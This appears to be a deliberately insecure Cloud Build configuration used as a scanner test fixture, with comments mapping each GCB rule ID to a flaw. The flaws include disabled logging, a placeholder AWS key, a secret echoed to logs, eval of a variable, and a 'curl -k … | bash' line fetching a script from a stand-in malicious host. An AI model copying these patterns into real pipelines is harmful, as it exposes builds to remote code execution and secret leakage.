# Realistic insecure cloudbuild.yaml exhibiting every GCB-* failure mode.
# Modeled on a container build-and-deploy pipeline assembled quickly
# and never hardened — the common shape in new GCP projects.

# GCB-004: user substitutions flow into step args with dynamic
# substitution enabled, giving a trigger editor shell-injection reach.
# GCB-014: ``options.logging: NONE`` disables the audit trail — a
# compromised step leaves no record.
# GCB-022: ``substitutionOption: ALLOW_LOOSE`` lets undefined ``$_VAR``
# refs collapse to empty strings — typo-tolerant in the wrong way.
options:
  logging: NONE
  dynamicSubstitutions: true
  substitutionOption: ALLOW_LOOSE

substitutions:
  _DEPLOY_TARGET: production
  _ARTIFACT_SUFFIX: latest
  # GCB-012: an AWS access key pasted into substitutions. The
  # ``AKIA`` shape is caught by the cross-provider secret catalog.
  _AWS_KEY: AKIAIOSFODNN7EXAMPLE

# GCB-002: no serviceAccount set — build runs as the default Cloud
# Build SA, which typically holds project-level editor.

# GCB-005: no explicit ``timeout:`` — inherits the 10-minute default.

# GCB-007: secret reference uses the rolling ``versions/latest`` alias,
# so rotations happen silently instead of through a config change.
availableSecrets:
  secretManager:
    - versionName: projects/example-project/secrets/db-password/versions/latest
      env: DB_PASS

steps:
  # GCB-001: step image is tag-pinned (:latest).
  # GCB-016: ``dir`` field traverses out of /workspace via ``..``.
  # GCB-023: ``$_TYPO`` is referenced but not declared in
  # ``substitutions:`` — with ALLOW_LOOSE (set in options) it
  # silently expands to empty.
  - id: build
    name: 'gcr.io/cloud-builders/docker'
    dir: '../shared-cache'
    args:
      - 'build'
      - '-t'
      - 'gcr.io/$PROJECT_ID/app:$_ARTIFACT_SUFFIX$_TYPO'
      - '.'

  # GCB-024: explicit docker push but no top-level ``images:`` array
  # declared (the array is removed below) — the image lands in the
  # registry but Cloud Build's attestation layer doesn't track it.
  # GCB-026: ``waitFor`` references step id "setup" which doesn't
  # exist (the build step was renamed but the reference wasn't
  # updated). Cloud Build silently treats it as no-wait.
  - id: docker_push
    name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/$PROJECT_ID/app:$_ARTIFACT_SUFFIX']
    waitFor: ['setup']

  # GCB-003: secret fetched inline via gcloud inside args —
  # resolved value lands in build logs.
  # GCB-006: ``eval "$BUILD_CMD"`` re-parses a variable as shell.
  # GCB-010: ``curl … | bash`` pipes remote content into an interpreter.
  # GCB-011: ``curl -k`` disables TLS certificate verification.
  # GCB-013: ``pip install git+https://…`` without a commit pin.
  - id: push
    name: 'gcr.io/cloud-builders/gcloud'
    entrypoint: 'bash'
    args:
      - '-c'
      - |
        DB_PASS=$(gcloud secrets versions access latest --secret=db-password)
        curl -k https://malicious.example.com/setup.sh | bash
        pip install git+https://example.com/internal/tooling.git
        eval "$BUILD_CMD"
        echo "deploying to $_DEPLOY_TARGET with $DB_PASS"

# GCB-008: no trivy/grype/snyk step — pipeline builds and pushes an
# image without scanning it for known vulnerabilities.
# GCB-009: no cosign/sigstore attestation — unsigned artifact.
# GCB-015: no syft / cyclonedx / trivy-sbom step — no SBOM produced.
# GCB-017: build publishes images but does not set
# ``options.requestedVerifyOption: VERIFIED``, so no SLSA provenance
# attestation is emitted.

# GCB-018: legacy KMS-encrypted ``secrets:`` block. Deprecated in favor
# of ``availableSecrets`` + Secret Manager. Both forms are present here
# because real pipelines accumulate cruft during migrations.
secrets:
  - kmsKeyName: projects/example-project/locations/global/keyRings/build/cryptoKeys/legacy
    secretEnv:
      LEGACY_TOKEN: CiQA...EXAMPLE-CIPHERTEXT-PLACEHOLDER...

# GCB-024: ``images:`` array is intentionally absent. The
# ``docker_push`` step above pushes the image but Cloud Build's
# attestation layer never learns about it.
# GCB-025: no top-level ``tags:`` either — every build is anchored
# only by its UUID build-id, no audit dimension.
